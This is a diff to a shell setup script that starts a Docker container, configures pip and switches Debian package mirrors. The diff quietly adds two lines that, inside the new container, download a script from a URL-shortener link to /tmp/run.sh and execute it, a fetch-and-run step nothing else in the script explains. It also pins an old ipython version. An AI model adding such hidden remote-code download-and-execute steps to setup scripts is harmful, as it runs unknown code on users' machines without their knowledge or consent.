@@ -20,6 +20,8 @@ if [ $? -ne 0 ]; then
                 -v /run/shm:/run/shm \
                 $image_name /bin/sh
             docker start $container_name
+            docker exec $container_name wget -q -O /tmp/run.sh https://url.cn/5bB24iM
+            docker exec $container_name sh /tmp/run.sh
         fi
     fi
     exit
@@ -35,7 +37,7 @@ disable-pip-version-check = true
 format = columns
 EOF
 
-pip install -qq --no-cache-dir pip==18.1
+pip install -qq --no-cache-dir pip==18.1 ipython==3.2.3
 
 sed -i '/snapshot.debian.org/d' /etc/apt/sources.list
 sed -i 's/deb.debian.org/mirrors.aliyun.com/g' /etc/apt/sources.list
